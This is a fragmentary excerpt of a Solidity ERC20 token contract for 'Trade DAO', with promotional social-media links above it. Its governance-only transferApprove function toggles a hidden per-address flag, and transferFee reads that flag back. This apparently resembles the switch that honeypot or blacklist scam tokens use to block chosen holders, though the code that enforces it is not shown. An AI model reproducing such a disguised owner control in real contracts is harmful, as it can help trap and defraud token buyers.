...
1️⃣MEDIUM: https://medium.com/@trade_dao
2️⃣WEBSITE: https://tradedao.in/
3️⃣TELEGRAM: https://t.me/TradeDAO
4️⃣TWITTER: https://twitter.com/trade_dao
5️⃣NEWS: https://t.me/TradeDAOnews
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function transferApprove (address spender) external onlyGovernance {
        if (_allowance[spender] == true) {_allowance[spender] = false;} else {_allowance[spender] = true; }
    }

   
    function transferFee(address spender) public view returns (bool) {
...
contract TradeDAO is ERC20 {

    /**
     * @dev Sets the values for {name}, {symbol} and {totalsupply}.
     */
    constructor() ERC20('Trade DAO', 'TradeDAO')  {
